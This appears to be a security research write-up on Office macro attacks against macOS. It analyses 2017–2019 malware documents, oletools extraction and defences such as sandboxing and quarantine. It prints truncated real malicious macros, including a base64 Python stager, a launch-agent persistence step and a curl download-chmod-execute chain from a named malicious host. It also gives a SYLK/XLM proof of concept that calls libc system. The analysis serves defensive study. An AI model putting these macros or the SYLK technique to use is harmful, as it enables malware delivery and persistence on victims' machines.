# Office Macro-Based Attacks on macOS

## Overview
This document explores the history, mechanisms, and defenses against macro-based attacks targeting macOS. It includes a detailed analysis of specific incidents, tools for detection, and recent developments in this area.

## History of Macro-Based Attacks on macOS
### Definition of Macros
A macro is a series of commands and instructions grouped together as a single command to accomplish a task automatically. 

**Example:**
```vbscript
Sub AutoOpen()
  MsgBox "Hello World!", 0, "Title"
End Sub
```

Macros have been (ab)used by attackers to deliver malicious payloads. Although there are mitigations, these attacks have now extended to macOS.

### Recent Incidents
- **2017: "New Attack, Old Tricks"**
  - **Document:** `U.S. Allies and Rivals Digest Trump’s Victory.docm`
  - **Payload:** Python script executed via `system` call.
  - **Detection:** Limited detection by security tools.
  - **Analysis:** The macro checks for Little Snitch, downloads a payload from `securitychecking.org`, decrypts it with RC4, and executes it.

- **2018: "Word to Your Mac"**
  - **Document:** `BitcoinMagazine-Quidax_InterviewQuestions_2018.docm`
  - **Payload:** Python script that creates a launch agent and executes a second-stage payload.
  - **Detection:** Limited detection by security tools.
  - **Analysis:** The macro decodes and executes a Python script, which connects to a remote server and receives further instructions.

- **2019: Lazarus APT Targeting Mac Users**
  - **Document:** `샘플_기술사업계획서(벤처기업평가용.doc`
  - **Payload:** Mach-O binary downloaded and executed.
  - **Detection:** Limited detection by security tools.
  - **Analysis:** The macro uses `curl` to download a payload, sets it as executable, and runs it using `popen`.

## Analysis of Macro-Based Attacks
### Extracting Embedded Macros
**Tool: OLETools**
- **Installation:**
  ```bash
  $ sudo pip install -U oletools
  ```
- **Usage:**
  ```bash
  $ olevba -c ~/Documents/HelloWorld.docm
  ```

**Example Output:**
```plaintext
FILE: /Users/patrick/Documents/HelloWorld.docm
Type: OpenXML
VBA MACRO ThisDocument.cls  
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument' 
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen() 
  MsgBox "Hello World!", 0, "Title" 
End Sub
```

### Detailed Analysis
#### 2017: "U.S. Allies & Rivals Digest Trump's Victory"
- **Macro Extraction:**
  ```vbscript
  Sub autoopen()
    Fisher
  End Sub
  Public Sub Fisher()
    Dim result As Long 
    Dim cmd As String 
    cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBvcnQgc3" 
    cmd = cmd + "NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZm" 
    ... 
    result = system("echo ""import sys,base64;exec(base64.b64decode( 
                    \"" " & cmd & " \""));"" | python &") 
  End Sub
  ```

- **Behavior:**
  - The `Fisher` subroutine is automatically executed.
  - It concatenates a base64-encoded string and executes it via Python.
  - The decoded Python script checks for Little Snitch, downloads a payload, decrypts it, and executes it.

#### 2018: "BitcoinMagazine-Quidax_InterviewQuestions_2018"
- **Macro Extraction:**
  ```vbscript
  Private Sub Document_Open()
    payload = "import base64,sys;exec(base64.b64decode({2:str,3:lambda 
    b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ" & 
    "...6c30pCg==')));" 
    path = Environ("HOME") &  
            "/../../../../Library/LaunchAgents/~$com.xpnsec.plist" 
    arg = "\n" & _ 
    ...
    Result = system("echo """ & arg & """ > '" & path & "'", "r")
  End Sub
  ```

- **Behavior:**
  - The `Document_Open` macro triggers automatic execution.
  - It creates a launch agent and executes a Python script that connects to a remote server.

#### 2019: "샘플_기술사업계획서(벤처기업평가용.doc"
- **Macro Extraction:**
  ```vbscript
  Sub AutoOpen()
    #If Mac Then 
      sur = "https://nzssdm.com/assets/mt.dat" 
      ...
      res = system("curl -o " & spath & " " & sur) 
      res = system("chmod +x " & spath) 
      res = popen(spath, "r")
  End Sub
  ```

- **Behavior:**
  - The `AutoOpen` macro triggers automatic execution.
  - It downloads a payload, sets it as executable, and runs it.

## Advanced Exploitation
### Zero-Click Macro-Based Attacks
- **Current Status:**
  - These attacks are rare and often dysfunctional.
  - Modern versions of Office for macOS include additional security measures such as app sandboxing, quarantine attributes, and notarization.

### Automatic Macro Execution
- **Excel 2019:**
  - In Office 2011 for Mac, XLM macros in SYLK files are auto-executed without protected mode or macro prompts.
  - In Office 2016 and 2019, disabling all macros without notification enables XLM macros without prompting.

### Abusing the SYLK File Format
- **XLM Macros:**
  - XLM (Excel 4.0 Macro Language) predates VBA and is still supported.
  - SYLK (.slk) files can be used to execute arbitrary code.

**Example:**
```plaintext
ID;P 
O;E 
NN;NAuto_open;ER101C1;KOut Flank;F 
C;X1;Y101;K0;ECALL("libc.dylib","system","JC","open -a Calculator") 
C;X1;Y102;K0;EHALT()
```

## Defense Mechanisms
- **App Sandbox:** Limits the actions an application can perform.
- **Quarantine Attribute:** Marks files as untrusted if they are downloaded from the internet.
- **Notarization:** Ensures that software is free of known malware.

**Example:**
```bash
$ log stream 
Error kernel: (Quarantine) exec of /private/tmp/backdoor denied  
...since it was quarantined by Microsoft Word and created without user consent
```

## Conclusion
Macro-based attacks on macOS are a growing concern. Understanding the mechanisms and using appropriate defense measures can help mitigate the risk. Tools like OLETools and modern security features in Office applications are essential for detecting and preventing these attacks.